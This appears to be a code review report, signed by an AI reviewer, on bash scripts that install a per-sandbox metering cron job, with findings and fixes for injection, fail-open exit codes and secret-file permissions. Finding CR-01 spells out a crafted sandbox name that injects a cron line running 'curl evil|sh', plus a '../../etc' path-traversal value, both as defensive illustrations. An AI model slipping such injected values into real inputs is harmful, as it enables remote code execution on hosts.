---
phase: 14-host-side-metering-loop
reviewed: 2026-06-08T00:00:00Z
depth: standard
files_reviewed: 7
files_reviewed_list:
  - scripts/install-nemoclaw-cron.sh
  - scripts/nemoclaw-cron-tick.sh
  - scripts/post-install-nemoclaw.sh
  - scripts/uninstall-nemoclaw-cron.sh
  - tests/stub-mount-env.sh
  - tests/stub-nemoclaw.sh
  - tests/test_nemoclaw_cron.sh
findings:
  critical: 2
  warning: 6
  info: 4
  total: 12
status: issues_found
---

# Phase 14: Code Review Report

**Reviewed:** 2026-06-08T00:00:00Z
**Depth:** standard
**Files Reviewed:** 7
**Status:** issues_found

## Summary

Reviewed the host-side NemoClaw metering loop: a per-sandbox crontab installer,
an uninstaller, a per-tick metering wrapper, the post-install wiring, and a
hermetic bash test harness with two stubs.

The scripts are carefully written in many respects (mode-600 env file, key kept
off the cron line and off argv, two-step crontab read-then-write to dodge the
truncation race, base64 transport for the in-sandbox config). However the review
surfaced two BLOCKER-class defects and several WARNINGs:

- **CR-01:** The unvalidated sandbox name is interpolated raw into the generated
  crontab line and into a `python3` heredoc, allowing crontab corruption /
  arbitrary-line injection and python source injection. This is the exact attack
  surface flagged in the review brief ("command injection via sandbox names").
- **CR-02:** The tick wrapper reports a stale `$?` and swallows cron.sh failure,
  so a failing metering run logs `rc=0` and the tick always exits 0 — the loop
  silently fails open, defeating the purpose of the metering loop.

The remaining WARNINGs concern fail-open mount handling, an unsafe-ish unmount,
non-atomic env-file write, and a couple of test-harness correctness bugs that can
mask real regressions.

## Critical Issues

### CR-01: Unvalidated sandbox name injected into crontab line and python heredoc

**File:** `scripts/install-nemoclaw-cron.sh:48,126,154` and `scripts/nemoclaw-cron-tick.sh:86`

**Issue:** `SANDBOX_NAME` is accepted from `--sandbox`, `REVENIUM_SANDBOX_NAME`,
or the uninstaller's positional `$1` with **no character validation**, then
interpolated verbatim into security-sensitive contexts:

1. `install-nemoclaw-cron.sh:154` builds the crontab line by string
   concatenation:
   ```bash
   CRON_LINE="${CRON_SCHEDULE} PATH=${CRON_PATH} REVENIUM_SANDBOX_NAME=${SANDBOX_NAME} ... ${CRON_COMMENT}"
   ```
   A sandbox name containing a newline injects an **arbitrary additional crontab
   line** (e.g. `foo$'\n'* * * * * curl evil|sh`), which `crontab -` installs and
   cron then executes. A name containing a space breaks the `REVENIUM_SANDBOX_NAME=`
   token so the tick runs with the wrong sandbox. A name containing `#` truncates
   the line / corrupts the marker.

2. The marker `CRON_COMMENT="# revenium-metering-nemoclaw:${SANDBOX_NAME}"`
   (line 48) is the idempotency/uninstall key. A name containing whitespace or
   regex-special bytes makes the later `grep -qF`/`grep -vF` matching unreliable,
   so idempotent re-install and targeted uninstall can fail to match — leaving
   duplicate or orphaned cron lines.

3. `nemoclaw-cron-tick.sh:86` interpolates `${MNT}` (which embeds the sandbox
   name) into a **python source string**:
   ```python
   p = "${MNT}/skills/revenium/guardrail-status.json"
   ```
   A sandbox name containing `"` or `\` injects python source. The mount path
   itself (`${HOME}/sbx-openclaw-${SANDBOX_NAME}`) is likewise unvalidated, so a
   name like `../../etc` is a path-traversal vector for the mountpoint and the
   `mkdir -p`/mount target.

**Fix:** Validate the sandbox name against a strict allow-list immediately after
resolution in **all three** entry points (install, uninstall, tick), before it is
used anywhere:
```bash
if ! [[ "${SANDBOX_NAME}" =~ ^[A-Za-z0-9._-]+$ ]]; then
  echo "ERROR: invalid sandbox name '${SANDBOX_NAME}' (allowed: A-Z a-z 0-9 . _ -)" >&2
  exit 2
fi
```
Additionally, pass `MAX_AGE_SECONDS` and the path into python via `os.environ`
rather than shell interpolation, so the python source is never built from
caller-controlled data:
```bash
MNT="${MNT}" MAX_AGE="${MAX_AGE_SECONDS}" python3 - <<'PY' || true
import json, os
p = os.path.join(os.environ['MNT'], 'skills/revenium/guardrail-status.json')
try:
    d = json.loads(open(p).read())
    d['_maxAgeSeconds'] = int(os.environ['MAX_AGE'])
    open(p, 'w').write(json.dumps(d, indent=2) + '\n')
except Exception:
    pass
PY
```

### CR-02: Tick logs stale `$?` and swallows cron.sh failure — loop fails open silently

**File:** `scripts/nemoclaw-cron-tick.sh:72-74,84,98`

**Issue:** Two compounding defects make a failed metering run indistinguishable
from success:

1. cron.sh failure is caught and discarded:
   ```bash
   OPENCLAW_HOME="${MNT}" bash "${SKILL_DIR}/scripts/cron.sh" || {
     log "cron.sh exited non-zero (rc=$?) — check host env"
   }
   ```
   The `|| { ... }` consumes the non-zero status (even under `set -e`), so the
   tick continues and ultimately **exits 0** regardless of whether metering
   actually ran. The metering loop fails open: a broken host env, missing CLI, or
   auth failure produces a green tick and no alert.

2. The final history line reports the wrong exit code:
   ```bash
   log "sandbox=${SANDBOX_NAME} rc=$?"
   ```
   At line 98, `$?` is the exit status of the **`python3 ... || true` block at
   line 84** (always 0), not cron.sh. Even inside the `||` handler at line 73,
   `rc=$?` is `$?` of the `log` builtin that ran just before it in the brace
   group's first statement context — it does not reliably reflect cron.sh either.
   Operators reading the log always see `rc=0`.

**Fix:** Capture cron.sh's status explicitly and propagate it as the tick's exit
code, and log that captured value:
```bash
cron_rc=0
OPENCLAW_HOME="${MNT}" bash "${SKILL_DIR}/scripts/cron.sh" || cron_rc=$?
if [[ "${cron_rc}" -ne 0 ]]; then
  log "cron.sh exited non-zero (rc=${cron_rc}) — check host env"
fi
# ... TTL stamp (best-effort) ...
log "sandbox=${SANDBOX_NAME} rc=${cron_rc}"
exit "${cron_rc}"
```
If a non-zero cron.sh must not fail the tick by policy, that should be an explicit,
documented decision — but the exit code and log MUST reflect reality so monitoring
can detect a stuck loop.

## Warnings

### WR-01: TTL-stamp python re-evaluates after a possibly-failed cron.sh, with no guard

**File:** `scripts/nemoclaw-cron-tick.sh:84-93`

**Issue:** The `_maxAgeSeconds` stamp runs unconditionally even when cron.sh
failed and never (re)wrote `guardrail-status.json`. If the file is stale or
absent the `except: pass` silently swallows it, so a tick can return success-ish
while stamping a TTL onto a stale status file — masking staleness from the very
freshness check `_maxAgeSeconds` exists to drive.

**Fix:** Only stamp when cron.sh succeeded (gate on `cron_rc -eq 0` from CR-02's
fix), and log when the stamp is skipped so stale-status situations are visible.

### WR-02: Non-atomic host-env write can leave a world-unreadable-but-truncated key file on crash

**File:** `scripts/install-nemoclaw-cron.sh:114-121`

**Issue:** The env file is written in place and `chmod 600` is applied *after* the
redirection completes:
```bash
{ printf 'REVENIUM_API_KEY=%s\n' ...; ... } > "${HOST_ENV_FILE}"
chmod 600 "${HOST_ENV_FILE}"
```
Between `>` creating/truncating the file (default umask perms, potentially 644)
and the `chmod 600`, the API key is on disk world-readable. On a shared host this
is a brief secret-exposure window. A crash between the two lines leaves the key at
644 permanently.

**Fix:** Create with restrictive perms from the start, atomically:
```bash
umask 077
tmp="${HOST_ENV_FILE}.tmp.$$"
{ printf 'REVENIUM_API_KEY=%s\n' "${REVENIUM_API_KEY:-}"; ... } > "${tmp}"
chmod 600 "${tmp}"
mv "${tmp}" "${HOST_ENV_FILE}"
```

### WR-03: Install proceeds (and writes the API key) even when REVENIUM_API_KEY is empty

**File:** `scripts/install-nemoclaw-cron.sh:116`

**Issue:** `printf 'REVENIUM_API_KEY=%s\n' "${REVENIUM_API_KEY:-}"` writes an
empty key without complaint. The cron will then run every minute against an empty
credential, silently failing forever (and the failure is invisible because of
CR-02). `post-install-nemoclaw.sh` guards `REVENIUM_API_KEY` for the creds step
(line 229) but `install_metering_loop` does not re-assert it.

**Fix:** Fail fast if the key is empty at install time:
```bash
[[ -n "${REVENIUM_API_KEY:-}" ]] || { echo "ERROR: REVENIUM_API_KEY not set" >&2; exit 2; }
```

### WR-04: Mount self-heal in the installer/tick is fail-open on stale/dead FUSE mounts

**File:** `scripts/install-nemoclaw-cron.sh:128-131`, `scripts/nemoclaw-cron-tick.sh:44-50`

**Issue:** The installer only remounts when `mountpoint -q` reports *not* mounted.
A FUSE/sshfs mount that has gone stale (server gone, `Transport endpoint is not
connected`) still reports as a mountpoint, so the `mkdir -p "${MNT}"` and the
`mountpoint -q` short-circuit operate on a dead mount and skip the remount. The
tick adds a `-d "${MNT}/skills"` liveness probe (better), but the installer does
not. Result: installer "succeeds" against a wedged mount.

**Fix:** In the installer, probe liveness like the tick does and force a clean
remount on a stale endpoint:
```bash
if ! mountpoint -q "${MNT}" 2>/dev/null || ! [[ -d "${MNT}/skills" ]]; then
  fusermount -u "${MNT}" 2>/dev/null || true   # clear a stale endpoint first
  nemoclaw "${SANDBOX_NAME}" share mount /sandbox/.openclaw "${MNT}" || { ...; exit 1; }
fi
```

### WR-05: Auto-install of sshfs is run unconditionally as the current user without sudo/root check

**File:** `scripts/install-nemoclaw-cron.sh:55-67`

**Issue:** `apt-get install -y sshfs` / `dnf install -y fuse-sshfs` are invoked
directly with `|| true`. As a non-root user these fail (permission denied) and the
`|| true` hides the real cause; the operator then sees only the generic
"auto-install failed" message. Worse, if the script *is* run as root in some flows,
it silently mutates host packages with no confirmation. The package-manager
detection also assumes the manager on PATH matches the running distro.

**Fix:** Gate the auto-install behind an explicit opt-in (e.g. only when
`$(id -u)` is 0 or `sudo -n true` succeeds), and surface the actual apt/dnf error
instead of `|| true` swallowing it. Otherwise just detect-and-instruct.

### WR-06: Uninstall writes a blank-line crontab and unmount lacks stale-endpoint handling

**File:** `scripts/uninstall-nemoclaw-cron.sh:53-55,64-66`

**Issue:** Two issues:
1. When removing the last entry, `echo "" | crontab -` installs a crontab whose
   sole content is one empty line rather than an empty crontab. On some `cron`
   implementations a whitespace-only crontab is fine, but it is cleaner (and
   avoids edge cases) to install genuinely empty input. Using `crontab -r` when
   `REMAINING` is empty removes the crontab outright — but note `crontab -r` errors
   if no crontab exists, so guard it.
2. The unmount path (`fusermount -u || umount || true`) is fail-open by design
   (T-14-08) but does not attempt `fusermount -uz` (lazy) for a busy/stale mount,
   so a wedged endpoint is left mounted with only a success message printed
   ("Mount at ... unmounted." prints even though `|| true` may have swallowed a
   failure — the message is unconditional).

**Fix:** Print the unmount-success message only on actual success, and try a lazy
unmount as a fallback:
```bash
if fusermount -u "${MNT}" 2>/dev/null || umount "${MNT}" 2>/dev/null || fusermount -uz "${MNT}" 2>/dev/null; then
  echo "Mount at ${MNT} unmounted."
else
  echo "WARN: could not unmount ${MNT} (left mounted)." >&2
fi
```

## Info

### IN-01: `grep -cF ... || echo 0` can emit a two-line count and break the numeric test

**File:** `tests/test_nemoclaw_cron.sh:396`

**Issue:** `_marker_count=$(grep -cF "..." "${CTAB_E}" 2>/dev/null || echo 0)`.
`grep -c` already prints `0` and exits 1 when there are no matches, so on no-match
this yields `_marker_count="0"$'\n'"0"` ("0\n0"). The subsequent `[[ "${_marker_count}" -eq 1 ]]`
then errors ("integer expression expected") under the harness, which can
mis-report. The same pattern risk applies wherever `grep -c ... || echo` is used.

**Fix:** Drop the `|| echo 0` (grep -c already prints 0), or normalize:
```bash
_marker_count=$(grep -cF "..." "${CTAB_E}" 2>/dev/null); _marker_count=${_marker_count:-0}
```

### IN-02: Test harness pushes argv/log tmp files into TMP_HOMES and rm -rf's them

**File:** `tests/test_nemoclaw_cron.sh:199,240,589` (and peers)

**Issue:** `TMP_HOMES+=("${NEMO_A}" "${MOUNT_A}")` mixes individual tmp *files*
into an array named for *home directories* that `cleanup()` removes with
`rm -rf`. It works (rm -rf on a file is fine) but the naming is misleading and a
future edit that assumes `TMP_HOMES` holds only directories could misbehave.

**Fix:** Track tmp files in a separate `TMP_FILES` array, or rename to `TMP_PATHS`.

### IN-03: Dead variable `STATUS_MTIME_BEFORE` in GROUP A

**File:** `tests/test_nemoclaw_cron.sh:205`

**Issue:** `STATUS_MTIME_BEFORE=""` is assigned and never read. GROUP A only
checks file existence, not mtime, so the variable is dead code that hints at an
intended-but-missing "status file not *modified*" assertion (it currently only
checks "not *created*").

**Fix:** Remove the variable, or implement the mtime-unchanged assertion it
implies (capture mtime before, assert unchanged after) for a stronger D-05 check.

### IN-04: Interval/PATH-baking logic duplicated verbatim from install-cron.sh

**File:** `scripts/install-nemoclaw-cron.sh:98-147`

**Issue:** The interval-range validation (98-101) and the CRON_PATH baking block
(136-147) are copied byte-for-byte from `install-cron.sh`. Comment on line 134
even says "verbatim from install-cron.sh lines 71-83". Duplicated logic drifts:
a fix to one (e.g. the stale-mount or a new brew path) will silently not apply to
the other.

**Fix:** Extract the shared PATH-baking and interval-validation into a sourced
helper (e.g. `scripts/lib/cron-common.sh`) consumed by both installers. Note SC4
forbids touching cron.sh/report.sh/guardrail-check.sh — a *new* shared lib does
not violate that.

---

_Reviewed: 2026-06-08T00:00:00Z_
_Reviewer: Claude (gsd-code-reviewer)_
_Depth: standard_
